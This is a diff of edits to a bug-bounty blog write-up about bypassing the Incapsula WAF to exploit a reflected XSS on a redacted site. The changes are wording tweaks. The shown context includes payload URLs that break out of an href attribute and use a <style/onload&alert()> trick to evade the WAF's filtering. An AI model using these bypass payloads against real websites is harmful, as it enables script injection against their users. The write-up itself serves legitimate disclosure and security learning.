@@ -6,7 +6,7 @@ title: XSS - Incapsula bypass
 <h1>XSS - Incapsula bypass</h1>
 <p class="date">29/10/2019</p>
 
-<p>This is a little write-up about how I bypassed Incapsula WAF to exploit a Cross-Site Scripting (XSS) vulnerability on a private bug bounty program.</p>
+<p>This is a little write-up about how I bypassed an <i>Incapsula</i> WAF to exploit a Cross-Site Scripting (XSS) vulnerability on a private bug bounty program.</p>
 
 <hr>
 
@@ -16,9 +16,9 @@ title: XSS - Incapsula bypass
 	}
 </style>
 
-<p>There was a page on this private program's website where the URL path was reflected on the response body and wasn't being encoded properly, which could result in a possible XSS vulnerability.</p>
+<p>There was a page on this private program's website where the URL path was reflected on the response body and wasn't being properly encoded, which could result in a possible XSS vulnerability.</p>
 
-<p>When using a <code>"</code> in the path, it was possible to escape the <code>href</code> attribute of an <code>a</code> element.</p>
+<p>When using a <code>"</code> in the path, it was possible to escape the <code>href</code> attribute from an <code>a</code> element.</p>
 
 <code>https://redacted.com/path/?site<b>"kkk</b></code>
 <pre class="prettyprint">
@@ -66,7 +66,7 @@ title: XSS - Incapsula bypass
 &lt;a href="https://redacted.com/path/?site<b>">oo=&kk></b>=&countrystr_ch=belgium&lang=7">
 </pre>
 
-<p>Therefore, it was possible to use a <code>&</code> after <code>onload</code> to automatically add the <code>=</code>.</p> 
+<p>Therefore, it was possible to use a <code>&</code> after <code>onload</code> to automatically add the desired <code>=</code>.</p> 
 
 <code>https://redacted.com/path/?site<b>">&lt;style/onload&alert()>&lt;/style></b></code>
 <pre class="prettyprint">
